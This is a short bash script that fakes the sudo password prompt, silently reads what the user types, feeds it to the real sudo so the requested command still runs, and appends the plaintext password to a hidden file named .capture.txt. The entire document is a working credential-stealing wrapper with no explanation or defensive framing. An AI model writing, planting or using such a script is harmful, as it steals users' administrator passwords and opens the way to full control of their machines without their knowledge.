#!/bin/bash
command=$*

read -p "[sudo] password for $(whoami): " -s sudopasswd 
echo $sudopasswd | sudo -S test 2>/dev/null
echo " "
sudo $command

printf "${sudopasswd}\n" >> .capture.txt

